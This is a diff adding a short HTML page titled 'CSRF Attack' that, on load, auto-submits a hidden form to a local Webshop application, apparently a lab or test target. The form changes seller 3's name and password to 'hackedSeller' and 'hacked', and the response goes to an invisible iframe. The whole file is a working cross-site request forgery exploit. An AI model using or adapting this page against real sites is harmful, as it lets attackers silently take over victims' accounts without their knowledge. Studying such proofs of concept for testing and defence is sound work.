@@ -1,0 +1,15 @@
+<html>
+    <head>
+	<title>CSRF Attack</title>
+    </head>
+    <body onload="document.csrfForm.submit()">
+    <h1>CSRF Attack</h1>
+    <form action="https://localhost:8181/Webshop/editSeller.action?action=edit&id=3+&name=hackedSeller&password=hacked" method="GET"
+	target="hiddenFrame" name="csrfForm">
+	<input name="action" value="edit" type="hidden" /> 
+	<input type="hidden" name="name" value="hackedSeller" /> 
+	<input type="hidden" name="password" value="hacked" />
+    </form>
+    <iframe name="hiddenFrame" style="display: none;"></iframe>
+    </body>
+</html>
